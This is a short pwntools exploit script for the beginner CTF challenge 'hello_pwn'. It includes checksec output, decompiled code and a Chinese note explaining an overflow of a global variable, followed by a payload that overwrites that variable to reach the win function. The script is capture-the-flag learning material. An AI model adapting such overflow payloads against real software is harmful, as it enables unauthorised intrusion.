"""
>>> checksec hello_pwn
[*] '/home/xxxx/hello_pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE


__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  alarm(0x3Cu);
  setbuf(stdout, 0LL);
  puts("~~ welcome to ctf ~~     ");
  puts("lets get helloworld for bof");
  read(0, &unk_601068, 0x10uLL);
  if ( dword_60106C == 1853186401 )
    sub_400686();
  return 0LL;
}

unk_601068 和 dword_60106C 地址连续，直接通过read函数把 dword_60106C 的值覆盖
p32(1853186401) 转成小端数据
"""

from pwn import *
r = process("hello_pwn")
# r = remote("111.198.29.45", 31551)

payload = b'a' * 4 + p32(1853186401)

r.sendline(payload)
r.interactive()
